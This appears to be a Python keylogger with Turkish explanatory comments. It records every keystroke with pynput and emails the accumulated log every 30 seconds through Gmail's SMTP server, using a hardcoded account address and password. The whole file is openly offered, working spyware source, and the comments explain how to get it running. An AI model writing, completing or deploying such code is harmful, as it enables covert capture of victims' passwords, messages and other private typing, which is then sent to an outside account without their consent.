import pynput.keyboard   # klavye hareketlerini kaydetmeye yarar
import smtplib           # mail yollama için
import threading         # kaydedilen logları belirtilen zamanda bir yani; 5dk, 10dk'da bir alınan logları mail olarak gönderme gibi işlere yarar.

log = ""

def callback_function(key):                      # Callback Function keyboarddan alınan verileri yollamaya yarayacak burada.
    global log               # Global'ın anlamı, yukarıda belirttiğimiz log'un bu ve tüm fonksiyonlarda kullanılması için aynı argüman olduğunu belirtme kodudur. Fonksiyon dışı olsa kullanmazdık.
    try:
        log = log + key.char.encode("utf-8")   # key argümanının char kısmı, klavyede her tuşa bastığımızda terminalde gösterirken her harfin başına u harfi koyuyor. Onu kaldırmak için.
        #log = log + str(key.char)             # encode(utf-8) kısmı ise türkçe karaktere basınca program kapandığı için türkçe karakter algılamayı sağlıyor.
    except AttributeError:
        if key == key.space: # boşluk, enter gibi keylere basınca program kapandığı ve attributeerror verdiği için try except çalıştırdık ve if kısmı ise eğer space'a basılırsa boşluk bırak demek.
            log = log + " "
        else:
            log = log + str(key)

    print(log)

def send_email(email,password,message):
    email_server = smtplib.SMTP("smtp.gmail.com",587)  # email yollamak için smtp serveri açtık içindeki bilgiler güncel olarak google'ın bağlanmaya izin verdiği gmail ve port numarası.
    email_server.starttls()                            # bağlantı açtık.
    email_server.login(email,password)                 # login olduk.
    email_server.sendmail(email,email,message)         # mail yollama. hangi mailden hangi maile yollanacağı ve mesaj kısmı.
    email_server.quit()                                # bağlantı sonlandırma.


def thread_function():          # while true: kullanmaya çalışınca sürekli döngü içinde olduğu için keylogger_listenerin öncesinde çalıştırdığında döngü dışına çıkmaz ve sadece boş mail gönderir.
    global log                  # Veya sonrasına alırsan keylogger_listener'da kendi içinde bir döngü olduğu için döngü dışına çıkmaz ve o da logları alır terminale yazdırır ama e mail göndermez.
    send_email("blackouthacktesting@gmail.com", "testtest123456", log)
    log = ""          # logu gönderdikten sonra sıfırlayıp yeni yazılan logu alıp tekrar gönderir ve yine sıfırlar. Bu böyle devam eder.
    timer_object = threading.Timer(30,thread_function)
    timer_object.start()

keylogger_listener = pynput.keyboard.Listener(on_press=callback_function)       # on_press, callback function sağlıyor. 
with keylogger_listener:                                                        # keylogger komutunun çalıştırılma şekli böyledir. with keylogger_listener: keylogger_listener.join()
    thread_function()         # Önce 30 sn kuralını başlatıyoruz.
    keylogger_listener.join() # Sonra log toplama başlıyor.